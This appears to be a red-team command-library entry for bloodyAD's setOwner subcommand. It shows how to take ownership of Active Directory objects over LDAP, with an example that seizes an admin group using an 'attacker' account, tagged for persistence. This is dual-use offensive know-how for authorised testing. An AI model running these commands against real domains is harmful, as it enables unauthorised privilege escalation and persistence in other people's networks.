---
id: 5ab2148a-1f7c-4e3a-9aeb-fccdd0520ca7
name: bloodyad-set-owner
type: command
executor: bash
data: >-
  bloodyAD.py --host $_DC_HOST -d $_DOMAIN -u $_USERNAME -p $_PASSWORD setOwner
  $_OWNER $_TARGET_OBJECT
output: null
created_at: '2023-04-06T03:56:06.890512+00:00'
updated_at: '2023-04-10T20:26:31.170427+00:00'
platforms:
  - Linux
  - Windows
tags:
  - active-directory
  - persistence
verified: true
validated: true
---

# bloodyad-set-owner

## Command

```bash
bloodyAD.py --host $_DC_HOST -d $_DOMAIN -u $_USERNAME -p $_PASSWORD setOwner $_OWNER $_TARGET_OBJECT
```

## Description

This command uses the BloodyAD Python tool to set the owner of an Active Directory object via LDAP modification. It's ideal for environments where PowerShell is restricted, requiring valid credentials with WriteOwner rights.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --host | Hostname or IP of the domain controller (e.g., my.dc.corp) | Yes |
| -d | Domain name (e.g., corp) | Yes |
| -u | Username for authentication | Yes |
| -p | Password for the user | Yes |
| setOwner | Subcommand to change ownership | Yes |
| $_OWNER | New owner principal (e.g., devil_user1) | Yes |
| $_TARGET_OBJECT | Target object name (e.g., target_object) | Yes |

## Examples

### Basic Usage

```bash
bloodyAD.py --host dc01.corp.com -d corp -u attacker -p Pass123 setOwner puppetuser targetgroup
```

### Advanced Usage

```bash
bloodyAD.py --host 192.168.1.10 -d corp -u serviceacct -p StrongPass --secure setOwner attackeruser CN=AdminGroup,CN=Users,DC=corp,DC=com
```

## Expected Output

On success: "Owner set successfully for [object]." On failure: LDAP error like "Insufficient access rights (50)" or connection issues. Verify by querying LDAP: ldapsearch -x -H ldap://$_DC_HOST -D "$_USERNAME@$_DOMAIN" -w "$_PASSWORD" -b "DC=$_DOMAIN,DC=com" "(name=$_TARGET_OBJECT)" owner.

## Related

- [[procedures/Active-Directory-Object-Owner-Hijacking]]
- [[tools/bloodyad]]
